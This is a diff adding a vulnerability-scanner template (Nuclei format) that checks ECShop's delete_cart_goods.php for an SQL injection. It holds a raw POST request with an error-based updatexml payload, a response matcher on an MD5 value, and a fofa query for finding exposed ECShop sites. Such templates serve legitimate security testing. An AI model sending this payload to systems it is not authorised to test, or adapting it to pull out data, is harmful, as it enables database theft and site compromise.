@@ -1,0 +1,34 @@
+id: ecshop-cnvd-2020-58823-sqli
+
+info:
+  name: ecshop delete_cart_goods.php sqli
+  author: SleepingBag945
+  severity: high
+  description: |
+    Get database data, and in serious cases get a Webshell
+  metadata:
+    fofa-query: product="ECShop"
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        POST /delete_cart_goods.php  HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Connection: keep-alive
+        Upgrade-Insecure-Requests: 1
+        Pragma: no-cache
+        Cache-Control: no-cache
+
+        id=1||(updatexml(1,concat(0x7e,(select%20md5(1))),1))
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200 && contains(body_1,"c4ca4238a0b923820dcc509a6f75849")'
+        condition: and
